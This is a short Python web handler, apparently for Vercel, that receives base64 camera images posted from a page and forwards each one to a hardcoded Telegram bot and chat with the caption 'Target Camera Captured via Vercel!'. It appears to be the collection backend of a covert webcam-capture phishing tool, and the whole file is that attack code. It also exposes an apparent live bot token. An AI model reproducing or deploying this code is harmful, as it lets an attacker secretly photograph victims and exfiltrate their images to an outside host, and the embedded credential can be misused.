import json
import base64
import requests
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = '8857558695:AAGOIJ_9PzeyvaOku_2-MxjdbZJILC'
OWNER_CHAT_ID = 6478868514

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            image_data = data.get('image')
            if image_data:
                header, encoded = image_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)

                files = {'photo': ('captured.jpg', image_bytes, 'image/jpeg')}
                data_payload = {
                    'chat_id': OWNER_CHAT_ID,
                    'caption': '📸 Target Camera Captured via Vercel!',
                    'parse_mode': 'Markdown'
                }
                requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data_payload, files=files)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())
          
